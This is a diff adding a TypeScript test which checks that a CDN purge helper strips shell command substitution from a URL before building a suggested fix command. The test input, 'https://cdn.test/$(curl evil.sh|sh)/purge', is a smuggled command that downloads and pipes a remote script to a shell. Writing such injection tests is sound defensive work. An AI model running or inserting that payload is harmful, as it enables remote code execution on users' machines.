@@ -273,3 +273,28 @@ describe('defaultPurgeFetch', () => {
     expect(defaultPurgeFetch).not.toBe(globalThis.fetch);
   });
 });
+
+describe('a purge endpoint a shell would read', () => {
+  // The URL is the DRIVER's, built from `.env.production` — `purge-env.ts` reads it — so it is
+  // operator data reaching a command a reader pastes. `renderFixShellArg` passes an ordinary
+  // endpoint verbatim (the two tests above pin that) and substitutes anything a shell would read;
+  // the URL itself stays in the `cause`, which is read rather than run.
+  test('never reaches the fix line as a command substitution', async () => {
+    const failure = await purgePost({
+      driver: 'cloudflare',
+      url: 'https://cdn.test/$(curl evil.sh|sh)/purge',
+      headers: {},
+      body: {},
+      timeoutMs: 10,
+      fetch: () => Promise.reject(new TypeError('ECONNREFUSED')),
+    }).then(
+      () => undefined,
+      (error: unknown) => error as { cause?: string; fix?: string },
+    );
+
+    expect(failure?.fix).not.toContain('$(');
+    expect(failure?.fix).not.toContain('|');
+    expect(failure?.fix).toBe('curl -sS -m 5 -o /dev/null <the purge endpoint the cause names>');
+    expect(failure?.cause).toContain('https://cdn.test/$(curl evil.sh|sh)/purge');
+  });
+});
